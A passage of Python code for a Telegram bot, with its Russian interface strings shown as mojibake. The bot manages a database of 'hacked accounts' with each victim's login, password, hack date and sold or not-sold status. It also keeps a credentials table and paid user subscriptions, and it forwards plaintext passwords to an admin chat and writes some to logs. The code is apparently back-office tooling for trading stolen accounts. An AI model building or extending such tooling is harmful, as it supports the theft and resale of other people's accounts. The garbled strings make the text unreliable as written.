                chat_id,
                "‚öôÔ∏è *–í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é –±–∞–∑—ã?*:",
                reply_markup=keyboard,
                parse_mode='Markdown'
            )
            logger.info(f"–ü—Ä–æ—Å–º–æ—Ç—Ä {call.data} —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à—ë–Ω –¥–ª—è {chat_id}")
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ {call.data} –¥–ª—è {chat_id}: {e}")
        bot.send_message(chat_id, "‚ùå *–û—à–∏–±–∫–∞ –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –¥–∞–Ω–Ω—ã—Ö! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)
    finally:
        conn.close()

@bot.callback_query_handler(func=lambda call: call.data.startswith('db_delete_'))
def handle_db_delete_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"–£–¥–∞–ª–µ–Ω–∏–µ {call.data} –æ—Ç {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        logger.warning(f"–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â—ë–Ω –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è {call.data}: {access}")
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        logger.error(f"–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è {call.data}")
        bot.send_message(chat_id, "‚ùå *–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞!*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)
        return
    try:
        with conn.cursor() as c:
            if call.data.startswith('db_delete_cred_'):
                _, login, idx = call.data.split('_', 2)
                logger.debug(f"–ü–æ–ø—ã—Ç–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è –ª–æ–≥–∏–Ω–∞ {login} (idx: {idx})")
                c.execute("SELECT login FROM credentials WHERE login = %s", (login,))
                if not c.fetchone():
                    logger.warning(f"–õ–æ–≥–∏–Ω {login} –Ω–µ –Ω–∞–π–¥–µ–Ω –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è")
                    bot.send_message(chat_id, f"‚ùå *–õ–æ–≥–∏–Ω `{login}` –Ω–µ –Ω–∞–π–¥–µ–Ω!*", parse_mode='Markdown')
                    bot.answer_callback_query(call.id)
                    return
                c.execute("DELETE FROM credentials WHERE login = %s", (login,))
                conn.commit()
                logger.info(f"–õ–æ–≥–∏–Ω {login} —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª—ë–Ω")
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"‚úÖ *–õ–æ–≥–∏–Ω #{idx} `{login}` —É–¥–∞–ª—ë–Ω!*",
                    parse_mode='Markdown'
                )
                bot.send_message(
                    ADMIN_CHAT_ID,
                    f"üóë *–ü–∞—Ä–æ–ª—å —É–¥–∞–ª—ë–Ω*\nüë§ *–õ–æ–≥–∏–Ω*: `{login}`\nüë§ *–£–¥–∞–ª–∏–ª*: {chat_id}",
                    parse_mode='Markdown'
                )
            elif call.data.startswith('db_delete_hacked_'):
                _, login, idx = call.data.split('_', 2)
                logger.debug(f"–ü–æ–ø—ã—Ç–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è hacked –∞–∫–∫–∞—É–Ω—Ç–∞ {login} (idx: {idx})")
                c.execute("SELECT login FROM hacked_accounts WHERE login = %s", (login,))
                if not c.fetchone():
                    logger.warning(f"–ê–∫–∫–∞—É–Ω—Ç {login} –Ω–µ –Ω–∞–π–¥–µ–Ω –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è")
                    bot.send_message(chat_id, f"‚ùå *–ê–∫–∫–∞—É–Ω—Ç `{login}` –Ω–µ –Ω–∞–π–¥–µ–Ω!*", parse_mode='Markdown')
                    bot.answer_callback_query(call.id)
                    return
                c.execute("DELETE FROM hacked_accounts WHERE login = %s", (login,))
                conn.commit()
                logger.info(f"–ê–∫–∫–∞—É–Ω—Ç {login} —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª—ë–Ω –∏–∑ hacked")
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"‚úÖ *–ê–∫–∫–∞—É–Ω—Ç #{idx} `{login}` —É–¥–∞–ª—ë–Ω –∏–∑ hacked!*",
                    parse_mode='Markdown'
                )
                bot.send_message(
                    ADMIN_CHAT_ID,
                    f"üóë *–ê–∫–∫–∞—É–Ω—Ç —É–¥–∞–ª—ë–Ω –∏–∑ hacked*\nüë§ *–õ–æ–≥–∏–Ω*: `{login}`\nüë§ *–£–¥–∞–ª–∏–ª*: {chat_id}",
                    parse_mode='Markdown'
                )
            elif call.data.startswith('db_delete_user_'):
                _, user_chat_id, idx = call.data.split('_', 2)
                logger.debug(f"–ü–æ–ø—ã—Ç–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_chat_id} (idx: {idx})")
                if user_chat_id == ADMIN_CHAT_ID:
                    logger.warning(f"–ü–æ–ø—ã—Ç–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è –°–æ–∑–¥–∞—Ç–µ–ª—è {user_chat_id}")
                    bot.send_message(chat_id, "üîí *–ù–µ–ª—å–∑—è —É–¥–∞–ª–∏—Ç—å –°–æ–∑–¥–∞—Ç–µ–ª—è!*", parse_mode='Markdown')
                    bot.answer_callback_query(call.id)
                    return
                c.execute("SELECT chat_id FROM users WHERE chat_id = %s", (user_chat_id,))
                if not c.fetchone():
                    logger.warning(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_chat_id} –Ω–µ –Ω–∞–π–¥–µ–Ω –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è")
                    bot.send_message(chat_id, f"‚ùå *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å `{user_chat_id}` –Ω–µ –Ω–∞–π–¥–µ–Ω!*", parse_mode='Markdown')
                    bot.answer_callback_query(call.id)
                    return
                c.execute("DELETE FROM users WHERE chat_id = %s", (user_chat_id,))
                conn.commit()
                logger.info(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_chat_id} —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª—ë–Ω")
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"‚úÖ *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å #{idx} `{user_chat_id}` —É–¥–∞–ª—ë–Ω!*",
                    parse_mode='Markdown'
                )
                bot.send_message(
                    ADMIN_CHAT_ID,
                    f"üóë *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–¥–∞–ª—ë–Ω*\nüÜî *Chat ID*: `{user_chat_id}`\nüë§ *–£–¥–∞–ª–∏–ª*: {chat_id}",
                    parse_mode='Markdown'
                )
        bot.answer_callback_query(call.id)
        logger.info(f"–£–¥–∞–ª–µ–Ω–∏–µ {call.data} —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–æ –¥–ª—è {chat_id}")
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è {call.data} –¥–ª—è {chat_id}: {e}")
        bot.send_message(chat_id, "‚ùå *–û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)
    finally:
        conn.close()

@bot.callback_query_handler(func=lambda call: call.data.startswith('db_add_') or call.data == 'db_main_menu')
def handle_db_add_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"–ö–Ω–æ–ø–∫–∞ {call.data} –æ—Ç {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    if call.data == 'db_main_menu':
        response = "üóÑ *–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –±–∞–∑–æ–π –¥–∞–Ω–Ω—ã—Ö*\n–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:"
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton("üîç –ü—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –¥–∞–Ω–Ω—ã–µ", callback_data="db_view"),
            types.InlineKeyboardButton("‚ûï –î–æ–±–∞–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ", callback_data="db_add"),
            types.InlineKeyboardButton("üóë –£–¥–∞–ª–∏—Ç—å –¥–∞–Ω–Ω—ã–µ", callback_data="db_delete")
        )
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=response,
            parse_mode='Markdown',
            reply_markup=keyboard
        )
        bot.answer_callback_query(call.id)
        return
    elif call.data == 'db_add_hacked':
        msg = bot.send_message(chat_id, "üìù *–í–≤–µ–¥–∏—Ç–µ –ª–æ–≥–∏–Ω –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ hacked*:", parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_db_add_hacked_login)
    elif call.data == 'db_add_cred':
        msg = bot.send_message(chat_id, "üìù *–í–≤–µ–¥–∏—Ç–µ –ª–æ–≥–∏–Ω –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ credentials*:", parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_db_add_cred_login)
    elif call.data == 'db_add_user':
        msg = bot.send_message(chat_id, "üìù *–í–≤–µ–¥–∏—Ç–µ Chat ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è*:", parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_db_add_user)
    bot.answer_callback_query(call.id)

def process_db_add_hacked_login(message):
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"–õ–æ–≥–∏–Ω: {login} –æ—Ç {chat_id}")
    if not login:
        bot.reply_to(message, "‚ùå *–õ–æ–≥–∏–Ω –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º!*", parse_mode='Markdown')
        return
    msg = bot.reply_to(message, "üîí *–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å*:", parse_mode='Markdown')
    bot.register_next_step_handler(msg, lambda m: process_db_add_hacked_password(m, login))

def process_db_add_hacked_password(message, login):
    chat_id = str(message.chat.id)
    password = sanitize_input(message.text)
    logger.info(f"–ü–∞—Ä–æ–ª—å –¥–ª—è {login}: {password}")
    if not password:
        bot.reply_to(message, "‚ùå *–ü–∞—Ä–æ–ª—å –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º!*", parse_mode='Markdown')
        return
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton("‚úÖ –ü—Ä–æ–¥–∞–Ω", callback_data=f"hacked_add_status_sold_{login}_{password}"),
        types.InlineKeyboardButton("‚õî –ù–µ–ø—Ä–æ–¥–∞–Ω", callback_data=f"hacked_add_status_not_sold_{login}_{password}")
    )
    bot.reply_to(message, "üìä *–í—ã–±–µ—Ä–∏—Ç–µ —Å—Ç–∞—Ç—É—Å –∞–∫–∫–∞—É–Ω—Ç–∞*:", reply_markup=keyboard, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data.startswith('hacked_add_status_'))
def handle_hacked_add_status(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"–°—Ç–∞—Ç—É—Å {call.data} –æ—Ç {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    try:
        _, status, login, password = call.data.split('_', 3)
        sold_status = "–ü—Ä–æ–¥–∞–Ω" if status == "sold" else "–ù–µ–ø—Ä–æ–¥–∞–Ω"
        conn = get_db_connection()
        if not conn:
            bot.send_message(chat_id, "‚ùå *–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞!*", parse_mode='Markdown')
            bot.answer_callback_query(call.id)
            return
        with conn.cursor() as c:
            c.execute(
                '''
                INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id)
                VALUES (%s, %s, %s, %s, %s, %s)
                ON CONFLICT (login) DO UPDATE
                SET password = EXCLUDED.password,
                    hack_date = EXCLUDED.hack_date,
                    prefix = EXCLUDED.prefix,
                    sold_status = EXCLUDED.sold_status,
                    linked_chat_id = EXCLUDED.linked_chat_id
                ''',
                (login, password, get_current_time().isoformat(), "–ê–¥–º–∏–Ω", sold_status, chat_id)
            )
            conn.commit()
            bot.send_message(
                chat_id,
                f"‚úÖ *–ê–∫–∫–∞—É–Ω—Ç `{login}` –¥–æ–±–∞–≤–ª–µ–Ω –≤ hacked!*\nüìä *–°—Ç–∞—Ç—É—Å*: {sold_status}",
                parse_mode='Markdown'
            )
            bot.send_message(
                ADMIN_CHAT_ID,
                f"üíæ *–ê–∫–∫–∞—É–Ω—Ç –¥–æ–±–∞–≤–ª–µ–Ω –≤ hacked*\nüë§ *–õ–æ–≥–∏–Ω*: `{login}`\nüîí *–ü–∞—Ä–æ–ª—å*: `{password}`\nüìä *–°—Ç–∞—Ç—É—Å*: {sold_status}\n‚ûï *–î–æ–±–∞–≤–∏–ª*: {chat_id}",
                parse_mode='Markdown'
            )
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è hacked: {e}")
        bot.send_message(chat_id, "‚ùå *–û—à–∏–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è!*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)
    finally:
        conn.close()

def process_db_add_cred_login(message):
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"–õ–æ–≥–∏–Ω –¥–ª—è credentials: {login} –æ—Ç {chat_id}")
    if not login:
        bot.reply_to(message, "‚ùå *–õ–æ–≥–∏–Ω –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º!*", parse_mode='Markdown')
        return
    msg = bot.reply_to(message, "üîí *–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å*:", parse_mode='Markdown')
    bot.register_next_step_handler(msg, lambda m: process_db_add_cred_password(m, login))

def process_db_add_cred_password(message, login):
    chat_id = str(message.chat.id)
    password = sanitize_input(message.text)
    logger.info(f"–ü–∞—Ä–æ–ª—å –¥–ª—è {login} –æ—Ç {chat_id}")
    if not password:
        bot.reply_to(message, "‚ùå *–ü–∞—Ä–æ–ª—å –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º!*", parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.reply_to(message, "‚ùå *–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞!*", parse_mode='Markdown')
        return
    try:
        with conn.cursor() as c:
            c.execute(
                '''
                INSERT INTO credentials (login, password, added_time, added_by)
                VALUES (%s, %s, %s, %s)
                ON CONFLICT (login) DO UPDATE
                SET password = EXCLUDED.password,
                    added_time = EXCLUDED.added_time,
                    added_by = EXCLUDED.added_by
                ''',
                (login, password, get_current_time().isoformat(), chat_id)
            )
            conn.commit()
            bot.reply_to(
                message,
                f"‚úÖ *–ü–∞—Ä–æ–ª—å –¥–ª—è `{login}` –¥–æ–±–∞–≤–ª–µ–Ω –≤ credentials!*",
                parse_mode='Markdown'
            )
            bot.send_message(
                ADMIN_CHAT_ID,
                f"üîê *–î–æ–±–∞–≤–ª–µ–Ω –ø–∞—Ä–æ–ª—å*\nüë§ *–õ–æ–≥–∏–Ω*: `{login}`\nüîí *–ü–∞—Ä–æ–ª—å*: `{password}`\n‚ûï *–î–æ–±–∞–≤–∏–ª*: {chat_id}",
                parse_mode='Markdown'
            )
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è: {e}")
        bot.reply_to(message, "‚ùå *–û—à–∏–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è!*", parse_mode='Markdown')
    finally:
        conn.close()

def process_db_add_user(message):
    chat_id = str(message.chat.id)
    user_chat_id = sanitize_input(message.text)
    logger.info(f"–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_chat_id} –æ—Ç {chat_id}")
    if not user_chat_id or not user_chat_id.isdigit():
        bot.reply_to(message, "‚ùå *Chat ID –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å–ª–æ–º!*", parse_mode='Markdown')
        return
    msg = bot.reply_to(message, "üìù *–í–≤–µ–¥–∏—Ç–µ –ø—Ä–µ—Ñ–∏–∫—Å (–Ω–∞–ø—Ä–∏–º–µ—Ä, –ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å, –ê–¥–º–∏–Ω, –¢–µ—Ö–ü–æ–º–æ—â–Ω–∏–∫)*:", parse_mode='Markdown')
    bot.register_next_step_handler(msg, lambda m: process_db_add_user_prefix(m, user_chat_id))

def process_db_add_user_prefix(message, user_chat_id):
    chat_id = str(message.chat.id)
    prefix = sanitize_input(message.text)
    logger.info(f"–ü—Ä–µ—Ñ–∏–∫—Å {prefix} –¥–ª—è {user_chat_id} –æ—Ç {chat_id}")
    if not prefix:
        bot.reply_to(message, "‚ùå *–ü—Ä–µ—Ñ–∏–∫—Å –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º!*", parse_mode='Markdown')
        return
    valid_prefixes = ['–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å', '–ê–¥–º–∏–Ω', '–¢–µ—Ö–ü–æ–º–æ—â–Ω–∏–∫', '–°–æ–∑–¥–∞—Ç–µ–ª—å']
    if prefix not in valid_prefixes:
        bot.reply_to(message, f"‚ùå *–ù–µ–¥–æ–ø—É—Å—Ç–∏–º—ã–π –ø—Ä–µ—Ñ–∏–∫—Å! –î–æ–ø—É—Å—Ç–∏–º—ã–µ: {', '.join(valid_prefixes)}*", parse_mode='Markdown')
        return
    if prefix == '–°–æ–∑–¥–∞—Ç–µ–ª—å' and chat_id != ADMIN_CHAT_ID:
        bot.reply_to(message, "üîí *–ü—Ä–µ—Ñ–∏–∫—Å –°–æ–∑–¥–∞—Ç–µ–ª—å —Ç–æ–ª—å–∫–æ –¥–ª—è –≥–ª–∞–≤–Ω–æ–≥–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞!*", parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.reply_to(message, "‚ùå *–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞!*", parse_mode='Markdown')
        return
    try:
        with conn.cursor() as c:
            subscription_end = (get_current_time() + timedelta(days=30)).isoformat()
            c.execute(
                '''
                INSERT INTO users (chat_id, prefix, subscription_end, last_activity, ip_hash, username)
                VALUES (%s, %s, %s, %s, %s, %s)
                ON CONFLICT (chat_id) DO UPDATE
                SET prefix = EXCLUDED.prefix,
                    subscription_end = EXCLUDED.subscription_end,
                    last_activity = EXCLUDED.last_activity,
                    ip_hash = EXCLUDED.ip_hash
                ''',
                (user_chat_id, prefix, subscription_end, get_current_time().isoformat(), hash_data(user_chat_id), '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')
            )
            conn.commit()
            bot.reply_to(
                message,
                f"‚úÖ *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å `{user_chat_id}` –¥–æ–±–∞–≤–ª–µ–Ω —Å –ø—Ä–µ—Ñ–∏–∫—Å–æ–º `{prefix}`!*",
                parse_mode='Markdown'
            )
            bot.send_message(
                ADMIN_CHAT_ID,
                f"üë§ *–î–æ–±–∞–≤–ª–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å*\nüÜî *Chat ID*: `{user_chat_id}`\nüîë *–ü—Ä–µ—Ñ–∏–∫—Å*: `{prefix}`\n‚ûï *–î–æ–±–∞–≤–∏–ª*: {chat_id}",
                parse_mode='Markdown'
            )
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: {e}")
        bot.reply_to(message, "‚ùå *–û—à–∏–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è!*", parse_mode='Markdown')
    finally:
        conn.close()

@bot.message_handler(commands=['viewdb'])
def viewdb_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
    logger.info(f"/viewdb –æ—Ç {chat_id}")
    access = check_access(chat_id, 'viewdb')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("üë• –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏", callback_data="db_view_users"),
        types.InlineKeyboardButton("üîê –ü–∞—Ä–æ–ª–∏", callback_data="db_view_credentials"),
        types.InlineKeyboardButton("üíª –í–∑–ª–æ–º–∞–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã", callback_data="db_view_hacked")
    )
    try:
        bot.reply_to(message, "üîç *–í—ã–±–µ—Ä–∏—Ç–µ —Ç–∞–±–ª–∏—Ü—É –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞*:", reply_markup=keyboard, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ /viewdb: {e}")
        bot.reply_to(message, "‚ùå *–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã!*", parse_mode='Markdown')

@bot.message_handler(commands=['techstop'])
def techstop_cmd(message):
    global tech_mode, tech_reason, tech_end_time
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
    logger.info(f"/techstop –æ—Ç {chat_id}")
    access = check_access(chat_id, 'techstop')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    if tech_mode:
        bot.reply_to(message, f"üõ† *–¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ —É–∂–µ –∞–∫—Ç–∏–≤–µ–Ω –¥–æ {format_time(tech_end_time)}!*", parse_mode='Markdown')
        return
    msg = bot.reply_to(message, "üìù *–í–≤–µ–¥–∏—Ç–µ –ø—Ä–∏—á–∏–Ω—É —Ç–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤–∞*:", parse_mode='Markdown')
    bot.register_next_step_handler(msg, lambda m: process_techstop_reason(m, username))

def process_techstop_reason(message, username):
    global tech_mode, tech_reason, tech_end_time
    chat_id = str(message.chat.id)
    tech_reason = sanitize_input(message.text)
    logger.info(f"–ü—Ä–∏—á–∏–Ω–∞ —Ç–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤–∞ –æ—Ç {chat_id}: {tech_reason}")
    if not tech_reason:
        bot.reply_to(message, "‚ùå *–ü—Ä–∏—á–∏–Ω–∞ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç–æ–π!*", parse_mode='Markdown')
        return
    msg = bot.reply_to(message, "üïí *–í–≤–µ–¥–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –≤ –º–∏–Ω—É—Ç–∞—Ö*:", parse_mode='Markdown')
    bot.register_next_step_handler(msg, lambda m: process_techstop_duration(m, username))

def process_techstop_duration(message, username):
    global tech_mode, tech_reason, tech_end_time
    chat_id = str(message.chat.id)
    duration = sanitize_input(message.text)
    logger.info(f"–î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å —Ç–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤–∞ –æ—Ç {chat_id}: {duration}")
    try:
        duration = int(duration)
        if duration <= 0:
            raise ValueError("–î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–π")
    except ValueError:
        bot.reply_to(message, "‚ùå *–î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å —á–∏—Å–ª–æ–º –±–æ–ª—å—à–µ 0!*", parse_mode='Markdown')
        return
    tech_mode = True
    tech_end_time = get_current_time() + timedelta(minutes=duration)
    response = (
        f"üõ† *–¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω!*\n"
        f"üìù *–ü—Ä–∏—á–∏–Ω–∞*: {tech_reason}\n"
        f"üïí *–û–∫–æ–Ω—á–∞–Ω–∏–µ*: {format_time(tech_end_time)}"
    )
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        bot.send_message(
            ADMIN_CHAT_ID,
            f"üõ† *–¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ –≤–∫–ª—é—á—ë–Ω*\nüìù *–ü—Ä–∏—á–∏–Ω–∞*: {tech_reason}\nüïí *–î–æ*: {format_time(tech_end_time)}\nüë§ *–í–∫–ª—é—á–∏–ª*: {chat_id}",
            parse_mode='Markdown'
        )
        for tech_id in get_tech_assistants():
            if tech_id != chat_id:
                try:
                    bot.send_message(
                        tech_id,
                        response,
                        parse_mode='Markdown'
                    )
                except Exception as e:
                    logger.error(f"–û—à–∏–±–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è —Ç–µ—Ö–ø–æ–º–æ—â–Ω–∏–∫–∞ {tech_id}: {e}")
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
        threading.Thread(target=techstop_timer, args=(duration, chat_id)).start()
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ —Ç–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤–∞: {e}")
        bot.reply_to(message, "‚ùå *–û—à–∏–±–∫–∞ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ —Ç–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤–∞!*", parse_mode='Markdown')

def techstop_timer(duration, chat_id):
    global tech_mode, tech_reason, tech_end_time
    logger.info(f"–¢–∞–π–º–µ—Ä —Ç–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤–∞ –Ω–∞ {duration} –º–∏–Ω—É—Ç")
    try:
        time.sleep(duration * 60)
        if tech_mode and tech_end_time <= get_current_time():
            tech_mode = False
            tech_reason = ""
            tech_end_time = None
            response = "‚úÖ *–¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ –∑–∞–≤–µ—Ä—à—ë–Ω!*"
            bot.send_message(chat_id, response, parse_mode='Markdown')
            bot.send_message(ADMIN_CHAT_ID, response, parse_mode='Markdown')
            for tech_id in get_tech_assistants():
                try:
                    bot.send_message(tech_id, response, parse_mode='Markdown')
                except Exception as e:
                    logger.error(f"–û—à–∏–±–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è —Ç–µ—Ö–ø–æ–º–æ—â–Ω–∏–∫–∞ {tech_id}: {e}")
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ —Ç–∞–π–º–µ—Ä–∞ —Ç–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤–∞: {e}")

@bot.message_handler(commands=['techstopoff'])
def techstopoff_cmd(message):
    global tech_mode, tech_reason, tech_end_time
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
    logger.info(f"/techstopoff –æ—Ç {chat_id}")
    access = check_access(chat_id, 'techstopoff')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    if not tech_mode:
        bot.reply_to(message, "‚úÖ *–¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ —É–∂–µ –æ—Ç–∫–ª—é—á—ë–Ω!*", parse_mode='Markdown')
        return
    tech_mode = False
    tech_reason = ""
    tech_end_time = None
    response = "‚úÖ *–¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ –ø—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ –∑–∞–≤–µ—Ä—à—ë–Ω!*"
    try:
